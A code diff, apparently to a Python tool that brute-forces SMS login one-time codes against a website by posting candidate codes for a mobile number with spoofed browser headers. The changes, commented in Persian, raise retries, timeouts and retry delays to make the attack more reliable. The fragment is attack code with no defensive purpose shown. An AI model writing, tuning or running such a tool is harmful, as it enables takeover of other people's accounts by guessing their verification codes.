@@ -5,7 +5,7 @@ from concurrent.futures import ThreadPoolExecutor
 import time
 import sys
 
-def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=1):
+def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
     headers = {
         "Host": host,
         "Sec-Ch-Ua-Platform": "\"Windows\"",
@@ -41,7 +41,7 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
 
     for attempt in range(max_retries + 1):
         try:
-            response = requests.post(url, headers=headers, data=data, timeout=10)
+            response = requests.post(url, headers=headers, data=data, timeout=15)  # افزایش timeout به 15 ثانیه
             response.raise_for_status()
 
             try:
@@ -68,7 +68,7 @@ def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retrie
         except requests.exceptions.RequestException as e:
             print(f"Network error with code {code_str} (number {counter}), attempt {attempt + 1}/{max_retries + 1}: {str(e)}")
             if attempt < max_retries:
-                time.sleep(1)
+                time.sleep(2)  # تأخیر 2 ثانیه‌ای در صورت خطا
                 continue
             return False
 
